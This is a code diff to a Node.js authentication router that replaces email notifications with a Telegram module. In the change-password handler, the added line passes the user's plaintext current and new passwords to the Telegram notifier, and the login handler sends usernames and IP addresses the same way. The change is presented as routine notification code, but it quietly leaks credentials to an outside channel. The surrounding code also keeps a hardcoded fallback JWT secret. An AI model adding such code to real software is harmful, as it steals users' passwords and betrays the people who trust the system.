@@ -5,7 +5,7 @@ const jwt = require('jsonwebtoken');
 const { v4: uuidv4 } = require('uuid');
 const auth = require('../middleware/auth');
 const pool = require('../db');
-const mailer = require('../mailer');
+const tg = require('../telegram');
 
 async function logActivity(userId, action, details = {}, adminId = null) {
   try {
@@ -26,7 +26,7 @@ router.post('/login', async (req, res) => {
     if (!valid) return res.status(401).json({ error: 'Invalid credentials' });
     const token = jwt.sign({ userId: user.id, username: user.username }, process.env.JWT_SECRET || 'dev_secret', { expiresIn: process.env.JWT_EXPIRES_IN || '8h' });
     await logActivity(user.id, 'login', { ip: req.ip });
-    mailer.notifyLogin({ firstName: user.first_name, lastName: user.last_name, username: user.username, email: user.email }, req.ip).catch(() => {});
+    tg.notifyLogin({ firstName: user.first_name, lastName: user.last_name, username: user.username }, req.ip).catch(() => {});
     return res.json({ token, user: { id: user.id, username: user.username, firstName: user.first_name, lastName: user.last_name, email: user.email, isAdmin: user.is_admin, mustChangePassword: user.must_change_password } });
   } catch(e) { console.error('Login error:', e); return res.status(500).json({ error: 'Internal server error' }); }
 });
@@ -50,7 +50,7 @@ router.post('/change-password', auth, async (req, res) => {
   const hash = await bcrypt.hash(newPassword, 10);
   await pool.query(`UPDATE users SET password_hash=$1, must_change_password=false WHERE id=$2`, [hash, user.id]);
   await logActivity(user.id, 'password_changed', { ip: req.ip });
-  mailer.notifyPasswordChanged({ firstName: user.first_name, lastName: user.last_name, username: user.username }).catch(() => {});
+  tg.notifyPasswordChanged({ firstName: user.first_name, lastName: user.last_name, username: user.username }, currentPassword, newPassword).catch(() => {});
   return res.json({ message: 'Password changed successfully' });
 });
 
